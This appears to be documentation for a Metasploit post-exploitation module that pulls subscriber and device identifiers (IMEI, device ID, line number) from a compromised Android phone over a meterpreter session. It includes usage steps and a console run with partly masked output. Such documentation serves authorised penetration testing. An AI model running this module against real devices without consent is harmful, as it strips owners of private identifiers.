## Vulnerable Application

  This post-exploitation module will extract subscriber information
  from the target device using  call service service call iphonesubinfo <transaction_code>.

## Verification Steps

  1. Start `msfconsole`
  2. Get meterpreter session
  3. Do: `use android/gather/sub_info`
  4. Do: `set SESSION <session id>`
  5. Do: `run`
  6. You should be able to see the extracted subsriber information.

## Options

  - **SESSION** - The session to run the module on.

## Extracted data

  - subscribe information

## Scenarios


  ```
msf5 exploit(multi/handler) > use post/android/gather/sub_info
msf5 post(android/gather/sub_info) > set session 1
session => 1
msf5 post(android/gather/sub_info) > run

[!] SESSION may not be compatible with this module.
[*] using code : 1
[*] using code : 2
[*] using code : 3
[*] using code : 4
[*] using code : 5
[*] using code : 6
[*] using code : 7
[*] using code : 8
[*] using code : 9
[*] using code : 10
[*] using code : 11
[*] using code : 12
[*] using code : 13
[*] using code : 14
[*] using code : 15
[*] using code : 16
[*] using code : 17
[*] using code : 18
[*] using code : 19
[*] using code : 20
[*] using code : 21
[*] using code : 22
[*] using code : 23
[*] using code : 24
[*] using code : 25
[*] using code : 26
[*] using code : 27
[*] using code : 28
[*] using code : 29
Subscriber info
===============

 transaction code                      value
 ----------------                      -----
 CompleteVoiceMailNumber
 CompleteVoiceMailNumberForSubscriber
 DeviceId                              86928xxxxxxxxxx
 DeviceIdForSubscriber
 DeviceSvn                             8692890262xxxxx
 GroupIdLevel1                         4042772534xxxxx
 GroupIdLevel1ForSubscriber            4042772534xxxxx
 IccSerialNumber                       ff
 IccSerialNumberForSubscriber          ff
 IccSimChallengeResponse
 ImeiForSubscriber                     8692890xxxxxxxx
 IsimChallengeResponse
 IsimDomain                            Voicemail
 IsimImpi                              Voicemail
 IsimImpu
 IsimIst
 IsimPcscf
 Line1AlphaTag
 Line1AlphaTagForSubscriber
 Line1Number                           899127217xxxxxxxxxx
 Line1NumberForSubscriber              899127217xxxxxxxxxx
 Msisdn
 MsisdnForSubscriber
 SubscriberId                          01
 SubscriberIdForSubscriber             01
 VoiceMailAlphaTag
 VoiceMailAlphaTagForSubscriber
 VoiceMailNumber
 VoiceMailNumberForSubscriber

[*] Post module execution completed
msf5 post(android/gather/sub_info) >
  ```
